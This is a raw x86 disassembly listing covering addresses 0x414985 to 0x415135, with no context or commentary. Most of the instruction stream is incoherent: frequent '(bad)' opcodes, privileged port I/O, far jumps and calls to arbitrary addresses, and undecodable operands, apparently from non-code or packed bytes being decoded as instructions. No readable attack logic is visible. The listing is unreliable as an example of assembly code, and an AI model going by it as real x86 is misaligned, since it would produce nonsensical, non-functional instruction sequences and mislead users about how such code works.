  414985:	andnps xmm1,XMMWORD PTR [ebx+0x6a5195b0]
  41498c:	xchg   ecx,eax
  41498d:	clc    
  41498e:	jle    0x4149d9
  414990:	mov    ecx,0x52e8c634
  414995:	mov    al,0x4
  414997:	add    dh,ch
  414999:	(bad)  
  41499a:	das    
  41499b:	mov    DWORD PTR [eax+0x5],esi
  41499e:	push   ss
  41499f:	inc    eax
  4149a0:	jne    0x4149d4
  4149a2:	add    ah,0x75
  4149a5:	cdq    
  4149a6:	add    DWORD PTR [edx-0x7b],ebp
  4149a9:	push   ds
  4149aa:	mov    BYTE PTR [eax+0x50019975],al
  4149b0:	clc    
  4149b1:	add    ch,BYTE PTR [edx-0x45]
  4149b4:	jne    0x4149b8
  4149b6:	out    0x53,eax
  4149b8:	clc    
  4149b9:	iret   
  4149ba:	mov    edi,0xe7a7f201
  4149bf:	xor    dh,0x92
  4149c2:	out    0x3,eax
  4149c4:	add    BYTE PTR [eax],al
  4149c6:	add    BYTE PTR [eax],al
  4149c8:	add    BYTE PTR [ebp+0x52],dh
  4149cb:	ins    BYTE PTR es:[edi],dx
  4149cc:	cmp    BYTE PTR [ebp+0x2503e702],0xa7
  4149d3:	push   ss
  4149d4:	xor    BYTE PTR [ecx-0x3df870f6],0xa7
  4149db:	out    0x80,eax
  4149dd:	not    BYTE PTR [eax+ebp*8+0x5c527503]
  4149e4:	jb     0x4149af
  4149e6:	add    edi,esp
  4149e8:	add    ecx,DWORD PTR [edi]
  4149ea:	add    ch,BYTE PTR [edx-0x45]
  4149ed:	cwde   
  4149ee:	call   0x8862:0xa793f233
  4149f5:	fild   DWORD PTR [ecx]
  4149f7:	out    0x3,eax
  4149f9:	cli    
  4149fa:	or     ebx,0x1
  4149fd:	jne    0x414a01
  4149ff:	inc    ecx
  414a00:	cld    
  414a01:	(bad)  
  414a02:	jl     0x414989
  414a04:	add    esi,DWORD PTR [ebp+0x2]
  414a07:	pop    ss
  414a08:	jg     0x4149fe
  414a0a:	popf   
  414a0b:	jmp    0xf4d5:0xb6527503
  414a12:	mov    ebp,0x1711bdb
  414a17:	out    0x3,eax
  414a19:	out    dx,al
  414a1a:	jl     0x414a75
  414a1c:	add    esi,DWORD PTR [ebp+0x2]
  414a1f:	aaa    
  414a20:	jg     0x414a06
  414a22:	test   eax,0x1c7503ea
  414a27:	out    0x80,eax
  414a29:	sub    eax,0x2d8fa7
  414a2e:	add    BYTE PTR [eax],al
  414a30:	add    BYTE PTR [eax],al
  414a32:	add    DWORD PTR fs:[eax],eax
  414a35:	jmp    0xe90fcdc7
  414a3a:	jbe    0x414a3e
  414a3c:	xchg   DWORD PTR [edx+0x1],ebp
  414a3f:	std    
  414a40:	(bad)  
  414a41:	call   0x6ccc44a2
  414a46:	mov    ebx,0x46e9fda6
  414a4b:	jnp    0x4149ce
  414a4d:	jmp    0x99414cca
  414a52:	or     ebp,ecx
  414a54:	sub    DWORD PTR ds:0xe8041a75,0x6c8b0276
  414a5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a60:	std    
  414a61:	jmp    0xfdf2c58c
  414a66:	js     0x414a6a
  414a68:	add    BYTE PTR [ebx+0x6c88176],al
  414a6e:	add    DWORD PTR [ecx+esi*1-0x18],eax
  414a72:	jbe    0x414aed
  414a74:	add    DWORD PTR [ebx],0x76
  414a77:	add    al,BYTE PTR [eax]
  414a79:	mov    ?,WORD PTR [eax]
  414a7b:	jg     0x4149fe
  414a7d:	add    eax,0x3cfda681
  414a82:	mov    bh,0xfd
  414a84:	(bad)  
  414a85:	cmp    ebp,esp
  414a87:	xchg   esi,eax
  414a88:	jg     0x414a47
  414a8a:	outs   dx,BYTE PTR ds:[esi]
  414a8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a8c:	std    
  414a8d:	jmp    0xc039ac87
  414a92:	or     DWORD PTR [eax+0xec00],ebp
  414a98:	add    BYTE PTR [eax],al
  414a9a:	add    dh,ah
  414a9c:	add    al,BYTE PTR [eax]
  414a9e:	jmp    0xa1c4c449
  414aa3:	adc    BYTE PTR [eax-0x39406e03],ch
  414aa9:	std    
  414aaa:	xchg   esi,eax
  414aab:	cmc    
  414aac:	sub    DWORD PTR [ecx+ebp*8],ecx
  414aaf:	(bad)  
  414ab0:	cmc    
  414ab1:	mov    BYTE PTR [eax],al
  414ab3:	add    DWORD PTR [edx],0x25244d87
  414ab9:	cmp    eax,0xe8fb568a
  414abf:	inc    ebp
  414ac0:	mov    ah,0xfb
  414ac2:	inc    DWORD PTR [ebp-0x3d]
  414ac5:	or     BYTE PTR [eax],al
  414ac7:	shr    DWORD PTR [edx],0xec
  414aca:	add    DWORD PTR [eax+0x59],0x7d
  414ace:	in     al,dx
  414acf:	clc    
  414ad0:	(bad)  
  414ad1:	(bad)  
  414ad2:	inc    DWORD PTR [ebx]
  414ad4:	and    eax,0xbc24bc
  414ad9:	add    BYTE PTR [eax],al
  414adb:	xor    al,0x65
  414add:	mov    eax,0x6482dc01
  414ae2:	and    al,0xc4
  414ae4:	add    DWORD PTR [ecx+0x148b084],ecx
  414aea:	add    BYTE PTR [ecx+edx*2-0x5a4fbb77],bl
  414af1:	in     eax,0x3f
  414af3:	pop    eax
  414af4:	push   esi
  414af5:	sti    
  414af6:	mov    ecx,ecx
  414af8:	test   eax,0x19deeb7
  414afd:	add    BYTE PTR [ebp+0x0],cl
  414b03:	add    al,dl
  414b05:	popf   
  414b06:	add    eax,0xfbbb21e8
  414b0b:	(bad)  
  414b0c:	cmp    esp,DWORD PTR ds:0x21e5de1
  414b12:	add    BYTE PTR [ebx+0x5301a288],cl
  414b18:	sub    BYTE PTR [ebx],0xb3
  414b1b:	xchg   edx,eax
  414b1c:	dec    ebp
  414b1d:	add    DWORD PTR [eax],eax
  414b1f:	call   0x3e5d58
  414b24:	dec    edi
  414b25:	mov    ah,0x37
  414b27:	ret    
  414b28:	cwde   
  414b29:	jmp    0x5056:0x1266534e
  414b30:	jne    0x414abe
  414b32:	xor    BYTE PTR [edx*2-0x7702ab18],ah
  414b39:	adc    edx,DWORD PTR [ebx]
  414b3b:	inc    eax
  414b3c:	jne    0x414afe
  414b3e:	(bad)  
  414b3f:	jle    0x414b8c
  414b41:	push   ds
  414b42:	clc    
  414b43:	das    
  414b44:	dec    ebp
  414b45:	adc    ch,BYTE PTR [ecx-0x53e7858c]
  414b4b:	adc    al,0x78
  414b4d:	adc    bh,BYTE PTR [edi+edx*1+0x5f]
  414b51:	mov    ds:0xaf9174aa,eax
  414b56:	js     0x414add
  414b58:	sbb    ebx,DWORD PTR [edx-0x1bbaffff]
  414b5e:	push   cs
  414b5f:	dec    esp
  414b60:	imul   ebx,DWORD PTR [ebx+0x1],0xffffff89
  414b64:	xor    edi,edi
  414b66:	jecxz  0x414aee
  414b68:	add    BYTE PTR [eax],al
  414b6a:	add    BYTE PTR [eax],al
  414b6c:	add    dl,bh
  414b6e:	dec    esp
  414b6f:	add    eax,DWORD PTR [eax]
  414b71:	jne    0x414b8b
  414b73:	ror    BYTE PTR [eiz*8-0x48a6b867],0xc6
  414b7b:	add    DWORD PTR [edx],esi
  414b7d:	mov    ch,0xf
  414b7f:	mov    cl,0x89
  414b81:	sub    DWORD PTR [edi+0x1e2b50fd],edi
  414b87:	jno    0x414b3b
  414b89:	je     0x414b26
  414b8b:	add    eax,ebp
  414b8d:	hlt    
  414b8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b8f:	add    al,0x0
  414b91:	inc    esi
  414b92:	shr    dh,0xc0
  414b95:	icebp  
  414b96:	fst    QWORD PTR [ecx+edx*2-0x21]
  414b9a:	lods   eax,DWORD PTR ds:[esi]
  414b9b:	dec    edi
  414b9c:	push   eax
  414b9d:	(bad)  
  414b9e:	out    0xdf,al
  414ba0:	pop    ds
  414ba1:	(bad)  
  414ba2:	or     BYTE PTR [ecx+0x41cadd13],ch
  414ba8:	add    BYTE PTR [esi-0xfc9d8a8],cl
  414bae:	add    dh,bl
  414bb0:	repz or BYTE PTR [ecx-0x62],0x2f
  414bb5:	js     0x414c36
  414bb7:	(bad)  
  414bb8:	(bad)  
  414bba:	fstp   DWORD PTR [esi+0xc]
  414bbd:	(bad)  
  414bbe:	cli    
  414bbf:	test   DWORD PTR [edi],ebp
  414bc1:	push   ecx
  414bc2:	push   cs
  414bc3:	ins    BYTE PTR es:[edi],dx
  414bc4:	cmp    BYTE PTR [ebx],0x2
  414bc7:	out    0x3,eax
  414bc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bca:	mov    ds:0x426b37d4,eax
  414bcf:	out    0x7e,eax
  414bd1:	add    BYTE PTR [eax],al
  414bd3:	add    BYTE PTR [eax],al
  414bd5:	add    BYTE PTR [ecx-0x782f922],dh
  414bdb:	mov    ah,0xe8
  414bdd:	add    esi,DWORD PTR [ebp+0x7f]
  414be0:	and    esi,edi
  414be2:	adc    al,BYTE PTR [edx]
  414be4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414be5:	dec    esi
  414be6:	mov    bh,0xf6
  414be8:	out    0xf5,al
  414bea:	adc    bl,BYTE PTR [eax-0x21c681c2]
  414bf0:	loop   0x414c48
  414bf2:	sub    esi,DWORD PTR [ebp+0x57]
  414bf5:	aad    0xba
  414bf7:	mov    ds:0xe8f9be7,eax
  414bfc:	call   0xd308b004
  414c01:	(bad)  
  414c02:	and    esi,edx
  414c04:	cdq    
  414c05:	push   esi
  414c06:	femms  
  414c08:	xchg   ebp,eax
  414c09:	push   ebx
  414c0a:	nop
  414c0b:	cs retf 
  414c0d:	jecxz  0x414c34
  414c0f:	dec    edi
  414c10:	out    dx,al
  414c11:	prefetchwt1 BYTE PTR [ecx]
  414c14:	daa    
  414c15:	add    al,0x3c
  414c17:	mov    edi,0xf5fe125d
  414c1c:	push   ss
  414c1d:	in     al,dx
  414c1e:	ret    
  414c1f:	mov    ds:0xa9f40153,eax
  414c24:	(bad)  [esi]
  414c26:	jb     0x414ca2
  414c28:	loopne 0x414c9d
  414c2a:	push   edx
  414c2b:	inc    ebp
  414c2c:	add    BYTE PTR [edx],dl
  414c2e:	xor    edi,esi
  414c30:	(bad)  
  414c31:	cli    
  414c32:	ss cdq 
  414c34:	cmc    
  414c35:	cmp    al,0xb8
  414c37:	xchg   esi,eax
  414c38:	jg     0x414bc7
  414c3a:	add    BYTE PTR [eax],al
  414c3c:	add    BYTE PTR [eax],al
  414c3e:	add    BYTE PTR [ebp-0x4],ah
  414c41:	(bad)  
  414c42:	call   0x5c969908
  414c47:	xchg   edx,eax
  414c48:	(bad)  
  414c49:	sti    
  414c4a:	xchg   ah,cl
  414c4c:	cdq    
  414c4d:	scas   eax,DWORD PTR es:[edi]
  414c4e:	sbb    ah,0xa4
  414c51:	std    
  414c52:	cld    
  414c53:	add    bh,BYTE PTR [edx+0x7b]
  414c56:	arpl   sp,cx
  414c58:	or     BYTE PTR cs:[eax-0x3c],ch
  414c5c:	lock xchg esi,eax
  414c5e:	clc    
  414c5f:	sbb    eax,0x95d7b7b
  414c64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c65:	dec    ecx
  414c66:	call   0x711a3de1
  414c6b:	call   0xfd14:0x852a39aa
  414c72:	mov    esp,0x278932c2
  414c77:	loope  0x414c54
  414c79:	std    
  414c7a:	es or  al,0x18
  414c7d:	adc    al,0x6c
  414c7f:	xor    dl,BYTE PTR [eax-0x3]
  414c82:	push   ss
  414c83:	fcom   QWORD PTR [ecx+0x51]
  414c86:	pop    esp
  414c87:	push   edx
  414c88:	push   0xffffff81
  414c8a:	xor    esp,ecx
  414c8c:	cdq    
  414c8d:	aas    
  414c8e:	mov    eax,0x29830277
  414c93:	pop    edi
  414c94:	pop    es
  414c95:	mov    DWORD PTR [edi],esp
  414c97:	sub    DWORD PTR [edx],ebx
  414c99:	mov    cl,cl
  414c9b:	xor    DWORD PTR [edx],eax
  414c9d:	mov    esp,DWORD PTR [esi+edi*8-0x65]
  414ca1:	std    
  414ca2:	(bad)  
  414ca3:	add    BYTE PTR [eax],al
  414ca5:	add    BYTE PTR [eax],al
  414ca7:	add    dh,al
  414ca9:	stos   BYTE PTR es:[edi],al
  414caa:	adc    DWORD PTR [esi+esi*2+0x2],ebx
  414cae:	add    DWORD PTR [eax],0xc
  414cb1:	fwait
  414cb2:	xchg   edx,eax
  414cb3:	shl    BYTE PTR [esi-0x39],0x71
  414cb7:	or     DWORD PTR [edi-0x3a],ecx
  414cba:	mov    cx,bx
  414cbd:	(bad)  
  414cbe:	idiv   edi
  414cc0:	adc    ebx,DWORD PTR [ecx]
  414cc2:	sbb    DWORD PTR [eax+0x50fb6ad7],0x13c41103
  414ccc:	dec    esp
  414ccd:	push   es
  414cce:	push   0x7
  414cd0:	mov    eax,ds:0xe458dff0
  414cd5:	icebp  
  414cd6:	int3   
  414cd7:	add    BYTE PTR [esi+ebx*1],bl
  414cda:	pop    ecx
  414cdb:	or     ebx,ebx
  414cdd:	loopne 0x414cda
  414cdf:	add    DWORD PTR [esi+eax*1],ecx
  414ce2:	add    bl,ch
  414ce4:	ja     0x414d13
  414ce6:	out    dx,al
  414ce7:	add    esp,ebx
  414ce9:	add    eax,0x68ec8589
  414cee:	sti    
  414cef:	jmp    DWORD PTR [ebp+ecx*1+0x40]
  414cf3:	dec    ecx
  414cf4:	or     DWORD PTR [eax+0x32],esi
  414cf7:	shl    BYTE PTR ds:0xcc0000c8,0x1e
  414cfe:	jns    0x414cf4
  414d00:	sti    
  414d01:	push   0x71
  414d03:	cld    
  414d04:	and    eax,esp
  414d06:	fist   WORD PTR [eax-0xa]
  414d09:	adc    DWORD PTR [edi-0x73],edx
  414d0c:	add    BYTE PTR [eax],al
  414d0e:	add    BYTE PTR [eax],al
  414d10:	add    cl,dh
  414d12:	jne    0x414cfc
  414d14:	sub    esi,DWORD PTR [esi+0x58830004]
  414d1a:	cdq    
  414d1b:	cmp    al,0x83
  414d1e:	cdq    
  414d1f:	sbb    DWORD PTR [esi-0x74fffa74],0x858936cb
  414d29:	hlt    
  414d2a:	ins    BYTE PTR es:[edi],dx
  414d2b:	sti    
  414d2c:	push   DWORD PTR [ebp-0x25]
  414d2f:	jbe    0x414cb4
  414d31:	add    eax,0xc5fda5b2
  414d36:	mov    bl,0x77
  414d38:	mov    WORD PTR [ebp-0x55],?
  414d3b:	add    al,0x7a
  414d3e:	das    
  414d3f:	test   BYTE PTR [eax],al
  414d41:	jne    0x414cee
  414d43:	repnz fsub DWORD PTR [esi+0x750083f3]
  414d4a:	stos   DWORD PTR es:[edi],eax
  414d4b:	pop    ss
  414d4c:	inc    edi
  414d4e:	fcomp  QWORD PTR [ebx]
  414d50:	add    BYTE PTR [ebp-0x55],dh
  414d53:	ror    DWORD PTR [ebx-0x254c510],0x12
  414d5a:	sti    
  414d5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d5c:	adc    esi,DWORD PTR [ebp-0x11ffbe43]
  414d62:	sbb    al,BYTE PTR [ecx+0xcbdfafe]
  414d68:	std    
  414d69:	mov    BYTE PTR [edi+0x2c754012],ch
  414d6f:	lods   al,BYTE PTR ds:[esi]
  414d70:	push   eax
  414d71:	push   0x43a65b
  414d76:	add    BYTE PTR [eax],al
  414d78:	add    BYTE PTR [eax],al
  414d7a:	fldcw  WORD PTR [ecx]
  414d7c:	daa    
  414d7d:	cld    
  414d7e:	(bad)  [ebx+0x2f470001]
  414d84:	cdq    
  414d85:	inc    edx
  414d86:	out    dx,al
  414d87:	ins    DWORD PTR es:[edi],dx
  414d88:	cmc    
  414d89:	push   eax
  414d8a:	call   0x4a91f2fc
  414d8f:	add    BYTE PTR [edi],ch
  414d91:	clc    
  414d92:	inc    ebx
  414d93:	clc    
  414d94:	push   cs
  414d95:	dec    esp
  414d96:	xchg   DWORD PTR [ebx+0x1],ebp
  414d99:	xor    DWORD PTR [ebp+0x38c5fc1e],0xffffff94
  414da0:	add    al,0x37
  414da2:	or     BYTE PTR [edi-0x7212fed3],dl
  414da8:	cli    
  414da9:	push   ebp
  414daa:	jp     0x414dad
  414dac:	cld    
  414dad:	out    0x84,eax
  414daf:	inc    edx
  414db0:	out    0x4d,eax
  414db2:	push   0xb512eaf6
  414db7:	add    cl,BYTE PTR [edi]
  414db9:	dec    ecx
  414dba:	ins    BYTE PTR es:[edi],dx
  414dbb:	adc    eax,0x72f678f3
  414dc0:	shl    BYTE PTR [esi+0x70bf3348],0x53
  414dc7:	mov    al,ds:0x9ac6a6ae
  414dcc:	tzmsk  eax,edi
  414dd1:	ins    BYTE PTR es:[edi],dx
  414dd2:	sbb    eax,DWORD PTR [edx]
  414dd4:	out    0x3,eax
  414dd6:	out    dx,al
  414dd7:	test   DWORD PTR [edi-0x58],eax
  414dda:	sbb    BYTE PTR [eax+0x3ad],ah
  414de0:	add    BYTE PTR [eax],al
  414de2:	add    BYTE PTR [ebp+0x42],dh
  414de5:	xor    BYTE PTR [ecx],dh
  414de7:	add    cl,BYTE PTR [ebp+0x40a1fb2c]
  414ded:	adc    bh,BYTE PTR [ebp+0x50e70b37]
  414df3:	cld    
  414df4:	scas   al,BYTE PTR es:[edi]
  414df5:	push   0xe70ac597
  414dfa:	add    eax,DWORD PTR [eax+edi*1-0x4a]
  414dfe:	js     0x414e26
  414e00:	ja     0x414e46
  414e02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e03:	shr    BYTE PTR [edx-0x60375629],1
  414e09:	ror    DWORD PTR [edi],0x1c
  414e0c:	xor    ebx,DWORD PTR [eax+eax*4+0x33]
  414e10:	lahf   
  414e11:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  414e13:	inc    ebp
  414e14:	sub    al,0xe7
  414e16:	js     0x414e3e
  414e18:	outs   dx,BYTE PTR ds:[esi]
  414e19:	push   0xffffffbb
  414e1b:	mov    al,ds:0x9bd61faa
  414e20:	lahf   
  414e21:	ins    BYTE PTR es:[edi],dx
  414e22:	ret    
  414e23:	adc    edi,ebp
  414e25:	jno    0x414de4
  414e27:	and    eax,0xd661002a
  414e2c:	inc    ecx
  414e2d:	add    BYTE PTR [ebp+esi*8-0x72],bl
  414e31:	stc    
  414e32:	out    0x18,al
  414e34:	xor    ch,al
  414e36:	sub    esp,0x2
  414e39:	add    BYTE PTR [ecx+edi*1+0xd],ch
  414e3d:	xchg   ebx,eax
  414e3e:	test   eax,0xf073c1f5
  414e43:	inc    ebp
  414e44:	pop    edi
  414e45:	data16 jo 0x414e48
  414e48:	add    BYTE PTR [eax],al
  414e4a:	add    BYTE PTR [eax],al
  414e4c:	retf   0xf98e
  414e4f:	mov    dh,0x18
  414e51:	mov    eax,DWORD PTR [ebx-0x262f3a3]
  414e57:	cmp    eax,ebx
  414e59:	bnd ret 
  414e5b:	cli    
  414e5c:	mov    dh,0x2
  414e5e:	mov    DWORD PTR [ebx+ebx*2-0x63],edx
  414e62:	std    
  414e63:	mov    ?,WORD PTR [edi+0xa]
  414e66:	mov    edi,esp
  414e68:	inc    edx
  414e69:	cmp    ch,al
  414e6b:	je     0x414e2d
  414e6d:	add    DWORD PTR [eax],eax
  414e6f:	push   0xd896d0d0
  414e74:	shl    DWORD PTR [ecx+ecx*4],1
  414e77:	das    
  414e78:	dec    ecx
  414e79:	mov    edi,DWORD PTR [ebx+0x65]
  414e7c:	or     DWORD PTR [esi+0x3776e838],esi
  414e82:	push   edi
  414e83:	push   0x9
  414e85:	popf   
  414e86:	or     eax,0xfd9fa06d
  414e8b:	jmp    0x649213dd
  414e90:	inc    edx
  414e91:	mov    ?,ecx
  414e93:	adc    BYTE PTR cs:[edx],dh
  414e96:	mov    ebp,DWORD PTR [ebp+esi*8-0x6a]
  414e9a:	std    
  414e9b:	push   ds
  414e9c:	inc    ecx
  414e9d:	stos   BYTE PTR es:[edi],al
  414e9e:	xor    eax,0x83027962
  414ea3:	sub    DWORD PTR [eax-0x62ffa87e],esp
  414ea9:	add    al,BYTE PTR [eax]
  414eab:	lea    edx,[ecx]
  414ead:	xchg   edx,eax
  414eae:	hlt    
  414eaf:	inc    DWORD PTR [eax]
  414eb1:	add    BYTE PTR [eax],al
  414eb3:	add    BYTE PTR [eax],al
  414eb5:	mov    esi,DWORD PTR [edx]
  414eb7:	mov    DWORD PTR [ebp-0x494f0],eax
  414ebd:	lods   al,BYTE PTR ds:[esi]
  414ebe:	adc    DWORD PTR [bx+si],edx
  414ec1:	outs   dx,BYTE PTR ds:[esi]
  414ec2:	inc    edx
  414ec3:	add    BYTE PTR [ebx-0x76ffad4f],al
  414ec9:	xchg   ecx,eax
  414eca:	push   esi
  414ecb:	jg     0x414ec5
  414ecd:	cmp    edx,DWORD PTR [edi+0x25d1e81]
  414ed3:	add    BYTE PTR [ebx-0x72049167],al
  414ed9:	shl    ecx,1
  414edb:	repnz (bad) 
  414edd:	(bad)  [ecx]
  414edf:	mov    DWORD PTR [ebp-0x49568],eax
  414ee5:	pop    esp
  414ee6:	adc    eax,0x67058481
  414eeb:	sti    
  414eec:	push   eax
  414eed:	in     al,0x74
  414eef:	mov    al,BYTE PTR [eax]
  414ef1:	sbb    al,0x1d
  414ef3:	ror    BYTE PTR [edi],0x90
  414ef6:	and    al,0x0
  414ef8:	add    BYTE PTR [edx+edi*8],cl
  414efb:	jg     0x414efd
  414efd:	fadd   QWORD PTR [ecx]
  414eff:	push   0x3
  414f01:	mov    BYTE PTR [edx],0x68
  414f04:	add    ah,cl
  414f06:	add    DWORD PTR [eax-0xae2ae73],eax
  414f0c:	(bad)  
  414f0d:	cmp    esi,DWORD PTR [ecx]
  414f0f:	mov    DWORD PTR [ebp+0x34],eax
  414f12:	jns    0x414ea4
  414f14:	jmp    0xc0c5b5a4
  414f19:	add    BYTE PTR [eax],al
  414f1b:	add    BYTE PTR [eax],al
  414f1d:	add    BYTE PTR [ebx-0x63ff67e3],bl
  414f23:	add    DWORD PTR [ecx-0x76ceabbb],ecx
  414f29:	jne    0x414fa0
  414f2b:	pxor   mm3,mm0
  414f2e:	(bad)  
  414f2f:	rcr    DWORD PTR [ecx-0x3ed06d03],1
  414f35:	je     0x414f4b
  414f37:	adc    BYTE PTR [esi],ch
  414f39:	in     al,0xee
  414f3b:	in     eax,dx
  414f3c:	test   DWORD PTR [edx-0x73],0xf0814c17
  414f43:	mov    bl,0x4
  414f45:	jne    0x414f0b
  414f47:	cmp    DWORD PTR [edi+edi*2],ecx
  414f4a:	arpl   WORD PTR [ebx+0x3475a001],bp
  414f50:	dec    ecx
  414f51:	mov    edi,DWORD PTR [ebx-0x3e3f7757]
  414f57:	jmp    0xaaeee207
  414f5c:	add    DWORD PTR [ecx+0x74a1263d],ecx
  414f62:	push   0x2e
  414f64:	call   0x88fd:0x38f17877
  414f6b:	mov    edi,0x28753ff3
  414f70:	int3   
  414f71:	std    
  414f72:	push   ds
  414f73:	nop
  414f74:	aaa    
  414f75:	push   ebp
  414f76:	clc    
  414f77:	in     eax,0x9b
  414f79:	push   eax
  414f7a:	or     eax,0xfafdabb7
  414f7f:	dec    edi
  414f80:	(bad)  
  414f81:	jae    0x414f83
  414f83:	add    BYTE PTR [eax],al
  414f85:	add    BYTE PTR [eax],al
  414f87:	push   ecx
  414f88:	pop    ebp
  414f89:	cmp    cl,BYTE PTR [ebx-0x260e910]
  414f8f:	loop   0x414fd3
  414f91:	(bad)  
  414f93:	fimul  DWORD PTR [ebx-0x73]
  414f96:	inc    ebx
  414f97:	jge    0x414fab
  414f99:	aam    0x86
  414f9b:	dec    eax
  414f9c:	xlat   BYTE PTR ds:[ebx]
  414f9d:	push   esp
  414f9e:	inc    ebx
  414fa0:	pop    ebp
  414fa1:	cdq    
  414fa2:	std    
  414fa3:	pusha  
  414fa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fa5:	idiv   BYTE PTR [edi]
  414fa7:	jne    0x414fab
  414fa9:	push   0x51
  414fab:	lods   eax,DWORD PTR ds:[esi]
  414fac:	pushf  
  414fad:	arpl   WORD PTR [edi-0x769bf1d7],di
  414fb3:	icebp  
  414fb4:	call   0xb025:0xaa25a30e
  414fbb:	mov    BYTE PTR [edx+ebp*2+0x7c018921],bl
  414fc2:	in     eax,dx
  414fc3:	out    dx,eax
  414fc4:	inc    esi
  414fc5:	out    dx,eax
  414fc6:	stos   DWORD PTR es:[edi],eax
  414fc7:	inc    esi
  414fc8:	stos   DWORD PTR es:[edi],eax
  414fc9:	out    0xa2,al
  414fcb:	inc    BYTE PTR [ebp-0x639f64ed]
  414fd1:	aaa    
  414fd2:	mov    ds:0xf8ce92e6,eax
  414fd7:	jbe    0x414fc9
  414fd9:	es add al,0xf6
  414fdc:	ret    0x88ee
  414fdf:	ds popf 
  414fe1:	mov    dh,0xa2
  414fe3:	dec    esp
  414fe4:	repz adc eax,0xe84a6eac
  414fea:	add    eax,DWORD PTR [eax]
  414fec:	add    BYTE PTR [eax],al
  414fee:	add    BYTE PTR [eax],al
  414ff0:	sbb    al,0x50
  414ff2:	ins    BYTE PTR es:[edi],dx
  414ff3:	dec    eax
  414ff4:	sbb    eax,0x18ab42ab
  414ff9:	pushf  
  414ffa:	mov    ds,WORD PTR [eax]
  414ffc:	add    eax,0x670fdc9c
  415001:	inc    edx
  415002:	out    0x5c,eax
  415004:	adc    eax,DWORD PTR [edx]
  415006:	out    0x3,eax
  415008:	out    dx,al
  415009:	test   DWORD PTR [ebx-0x60],edx
  41500c:	lock fwait
  41500e:	sub    eax,0xb0427503
  415013:	sbb    dl,ch
  415015:	xchg   DWORD PTR [edi+edx*4-0x4e700934],ebp
  41501c:	rcr    BYTE PTR [ebx+0x76f690e7],cl
  415022:	cmp    al,0xa2
  415024:	rol    ah,0x0
  415027:	jmp    0xb48892a2
  41502c:	adc    edx,edx
  41502e:	mov    edi,0xc73934c6
  415033:	sub    edi,DWORD PTR [edx+0x2]
  415036:	push   0xffffffe9
  415038:	dec    eax
  415039:	add    ch,BYTE PTR [edx-0x17]
  41503c:	pusha  
  41503d:	add    BYTE PTR [edx-0x17],ch
  415040:	xlat   BYTE PTR ds:[ebx]
  415041:	push   ss
  415042:	and    al,0xdd
  415044:	xlat   BYTE PTR ds:[ebx]
  415045:	out    dx,eax
  415046:	mov    ebx,ebx
  415048:	add    cl,BYTE PTR ss:[ecx-0x7900a563]
  41504f:	sub    BYTE PTR [ebp-0x2f],bh
  415052:	(bad)  
  415053:	add    BYTE PTR fs:[eax],al
  415056:	add    BYTE PTR [eax],al
  415058:	add    BYTE PTR [ecx],bh
  41505a:	or     eax,0xa33a993
  41505f:	add    BYTE PTR [eax+eax*1],dh
  415062:	scas   al,BYTE PTR es:[edi]
  415063:	or     ebp,0x9ec80e9
  415069:	mov    BYTE PTR ds:0x9ba6bae8,dh
  41506f:	std    
  415070:	bound  edx,QWORD PTR [edx-0x72567c0a]
  415076:	push   ds
  415077:	mov    esp,DWORD PTR ds:0x350070d
  41507d:	sbb    DWORD PTR [eax+0x4b0ec544],ecx
  415083:	push   0xffffffe9
  415085:	dec    ebp
  415086:	popf   
  415087:	adc    esi,DWORD PTR [ecx]
  415089:	aaa    
  41508a:	inc    ecx
  41508b:	add    BYTE PTR [ecx+esi*1+0x1a],ch
  41508f:	popa   
  415090:	push   0xffffff95
  415092:	out    0x13,al
  415094:	jmp    0xddc28f1b
  415099:	(bad)  
  41509b:	(bad)  
  41509c:	fsubr  QWORD PTR [ebx-0x63]
  41509f:	je     0x4150a6
  4150a1:	fldenv [edx+0x6900099]
  4150a7:	add    BYTE PTR [ebp-0xb80c74],al
  4150ad:	clc    
  4150ae:	mov    ds:0x10f4e81d,al
  4150b3:	std    
  4150b4:	jmp    DWORD PTR [edi]
  4150b6:	pop    esi
  4150b7:	sbb    ebx,0x67b808
  4150bd:	add    BYTE PTR [eax],al
  4150bf:	add    BYTE PTR [eax],al
  4150c1:	add    bh,bl
  4150c3:	data16 mov cl,0xb0
  4150c6:	popf   
  4150c7:	inc    BYTE PTR [eax+0x28a908c0]
  4150cd:	add    eax,0x3fc0c8
  4150d2:	mov    DWORD PTR [esi+0x7c5c42ed],ecx
  4150d8:	add    DWORD PTR [eax],esp
  4150da:	xor    bh,BYTE PTR [edi]
  4150dc:	add    BYTE PTR [eax],dl
  4150de:	enter  0x870d,0x4d
  4150e2:	pusha  
  4150e3:	scas   eax,DWORD PTR es:[edi]
  4150e4:	jle    0x415096
  4150e6:	pop    esp
  4150e7:	push   es
  4150e8:	add    BYTE PTR [ebx-0x7e7afd7f],cl
  4150ee:	mov    esp,0x5f000005
  4150f3:	arpl   WORD PTR [ecx],dx
  4150f5:	add    al,0x4f
  4150f7:	inc    esi
  4150f8:	add    bh,bh
  4150fa:	mov    DWORD PTR [edx+0x632c75fc],ebp
  415100:	jno    0x41511e
  415102:	add    esi,ecx
  415104:	pop    ss
  415105:	push   edi
  415106:	add    esi,ecx
  415108:	ud0    ecx,DWORD PTR [ecx]
  41510b:	or     bh,bl
  41510d:	jne    0x415113
  41510f:	arpl   WORD PTR [ecx],dx
  415111:	inc    eax
  415112:	loop   0x415152
  415114:	add    BYTE PTR [edi-0x79],bl
  415117:	xchg   ecx,esp
  415119:	pop    ebp
  41511a:	sahf   
  41511b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41511c:	std    
  41511d:	push   esp
  41511e:	imul   edi,DWORD PTR [di-0x14],0x2df75
  415126:	add    BYTE PTR [eax],al
  415128:	add    BYTE PTR [eax],al
  41512a:	add    BYTE PTR [ebp+0x5c],dh
  41512d:	mov    al,ds:0x3e148573
  415132:	or     dl,al
  415134:	dec    esi
  415135:	in     eax,dx
